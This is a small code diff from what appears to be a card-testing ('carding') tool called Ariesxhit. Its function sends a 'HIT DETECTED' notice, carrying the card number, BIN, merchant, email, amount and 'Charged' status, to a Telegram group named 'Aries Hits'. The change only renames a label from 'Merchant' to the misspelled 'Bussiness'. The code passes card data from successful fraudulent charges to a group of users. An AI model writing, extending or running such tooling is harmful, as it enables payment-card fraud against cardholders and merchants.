@@ -528,7 +528,7 @@ async function sendHitToGroups(hitData, checkoutUrl) {
     if (GROUP_2) {
       const bin = hitData.bin || 'Unknown';
       const binSource = hitData.binMode || '';
-      const group2Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗\n─────────────────\n\n「❃」 Name :- ${userNameLink}\n「❃」 Card :- ${hitData.card}\n「❃」 Bin :- ${bin}${binSource}\n「❃」 Merchant :- ${hitData.merchant}\n「❃」 Email :- ${hitData.email || 'Unknown'}\n「❃」 Amount :- ${hitData.amount}\n「❃」 Response : Charged\n「❃」 Attempt :- ${hitData.attempts}\n「❃」 Time :- ${hitData.timeTaken}\n\n─────────────────\nThanks For Using Ariesxhit. 💗`;
+      const group2Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗\n─────────────────\n\n「❃」 Name :- ${userNameLink}\n「❃」 Card :- ${hitData.card}\n「❃」 Bin :- ${bin}${binSource}\n「❃」 Bussiness :- ${hitData.merchant}\n「❃」 Email :- ${hitData.email || 'Unknown'}\n「❃」 Amount :- ${hitData.amount}\n「❃」 Response : Charged\n「❃」 Attempt :- ${hitData.attempts}\n「❃」 Time :- ${hitData.timeTaken}\n\n─────────────────\nThanks For Using Ariesxhit. 💗`;
 
       const group2Result = await sendMessage(BOT_TOKEN, GROUP_2, group2Message);
       console.log('✅ Group notification sent to Aries Hits, result:', group2Result);
